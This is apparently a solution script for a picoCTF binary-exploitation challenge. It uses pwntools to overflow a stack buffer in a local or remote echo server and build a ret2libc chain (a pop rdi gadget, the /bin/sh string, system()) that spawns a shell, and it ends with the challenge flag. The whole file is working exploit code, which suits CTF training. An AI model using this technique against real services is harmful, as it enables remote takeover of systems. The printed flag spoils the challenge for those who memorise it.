from pwn import process, remote, gdb, context, ELF, cyclic, cyclic_find, flat, asm, write, info, args
import sys


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'\n', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    if p.corefile is not None:
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
        info('located EIP/RIP offset at {a}'.format(a=ip_offset))
        return ip_offset
    else:
        info('No corefile generated; cannot determine IP offset.')
        return None


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

def find_ip_remote(payload1):
    # Launch process and send payload
    p = remote(sys.argv[1], sys.argv[2])
    p.sendlineafter(b'\n', payload1)
    # For remote, we cannot access corefile, so just interact or close
    info('Cannot determine IP offset remotely; corefile is unavailable.')
    p.close()
    return None

payload2 = cyclic(200)

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
#offset = find_ip(cyclic(200))

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
#libc_base = 0x00007ffff7fcc000 # system
libc_base = 0x00007fa343697a30
system = libc_base + 0x4f4e0
binsh = libc_base + 0x1b40fa

# POP RDI gadget (found with ropper)
pop_rdi = 0x400913

# How many bytes to the instruction pointer (RIP)?
padding = 136

payload2 = flat(
    asm('nop') * padding,  # Padding up to RIP
    pop_rdi,  # Pop the following address into the RDI register
    binsh,  # Address of /bin/sh in libc
    system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload2)

# Exploit
io.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n', payload2)

# Get flag/shell
io.interactive()

#picoCTF{1_<3_sm4sh_st4cking_e900800fb46131e}